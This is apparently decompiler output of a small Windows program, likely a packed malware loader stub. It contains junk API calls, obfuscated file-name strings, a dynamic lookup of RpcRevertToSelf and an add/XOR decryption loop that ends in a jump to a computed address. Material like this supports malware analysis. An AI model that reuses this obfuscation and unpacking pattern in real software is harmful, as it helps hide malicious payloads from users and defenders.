/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
int __stdcall sub_412CB2(unsigned int, int, _DWORD *);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401024; // weak
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetLastError)();
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
CHAR ProcName[] = "RpcRevertToSelf"; // idb
CHAR LibFileName[] = "rpcrt4.DLL"; // idb
WCHAR aUb9qcbywj8efyf[] = L"\u4275\u5139\u6263\u7779\u386A\u6645\u6659\u3841\u6E37\u4D50\u4E42\u642E\u3747"; // idb
WCHAR aQ369uubjpcecxx[] = L"\u3371\u3936\u5555\u4A42\u4370\u4365\u5878\u6837\u2E68\u48691"; // idb
WCHAR aXa48cww1uwingi[] = L"\u4178\u3834\u5743\u3177\u5775\u4E49\u4967\u4D76\u6A4A\u534B\u4E45\u552E\u5433"; // idb
CHAR a3hcdkdyazd45xx[] = "3HCdkdyAzd4.5XX"; // idb
WCHAR FileName[] = L"\u2E45\u78483"; // idb


//----- (00412920) --------------------------------------------------------
int start()
{
  HANDLE hObject; // [esp+0h] [ebp-34h]
  RPC_STATUS (__stdcall *RpcRevertToSelf)(); // [esp+8h] [ebp-2Ch]
  int v3; // [esp+Ch] [ebp-28h]
  HMODULE hModule; // [esp+10h] [ebp-24h]
  HANDLE FileW; // [esp+1Ch] [ebp-18h]
  HANDLE FileA; // [esp+20h] [ebp-14h]
  HANDLE hFile; // [esp+28h] [ebp-Ch]

  GetCommandLineA();
  GetCommandLineA();
  GetLastError();
  GetLastError();
  hFile = CreateFileW(FileName, 0x40000000u, 2u, 0, 3u, 3u, 0);
  GetFileSize(hFile, 0);
  hObject = CreateFileW(aQ369uubjpcecxx, 0x20000000u, 1u, 0, 3u, 1u, 0);
  if ( hObject == (HANDLE)-1 )
  {
    FileW = CreateFileW(aUb9qcbywj8efyf, 0x80000000, 6u, 0, 3u, 0x104u, 0);
    GetCommandLineA();
    do
    {
      GetFileSize(hFile, 0);
      GetFileType(hFile);
      FileA = CreateFileA(a3hcdkdyazd45xx, 0x60000000u, 1u, 0, 3u, 0xA2u, 0);
      GetCommandLineA();
      hModule = LoadLibraryA(LibFileName);
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetLastError();
      RpcRevertToSelf = GetProcAddress(hModule, ProcName);
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetFileSize((HANDLE)0xFFFFFFFF, 0);
      CloseHandle(FileW);
      GetCommandLineA();
      GetCommandLineA();
      GetFileType(FileA);
    }
    while ( CreateFileW(aXa48cww1uwingi, 0, 4u, 0, 3u, 0x103u, 0) != (HANDLE)-1 );
    GetFileSize(FileW, 0);
    v3 = RpcRevertToSelf();
    GetFileSize(FileA, 0);
    GetCommandLineA();
    GetLastError();
    __asm { jmp     [ebp+var_10] }
  }
  return ((int (__cdecl *)(HANDLE))loc_401024)(hObject);
}

//----- (00412CB2) --------------------------------------------------------
int __stdcall sub_412CB2(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int v3; // ecx
  int result; // eax

  v3 = a1 >> 2;
  result = a2;
  do
  {
    *a3 += a2;
    *a3 += 1583069768;
    *a3 ^= a2;
    *a3 ^= 0x7504DEB1u;
    *a3 += 1383211988;
    *a3 = -*a3;
    *a3 ^= a2;
    *a3 -= 505653225;
    *a3++ += a2;
    --v3;
  }
  while ( v3 );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
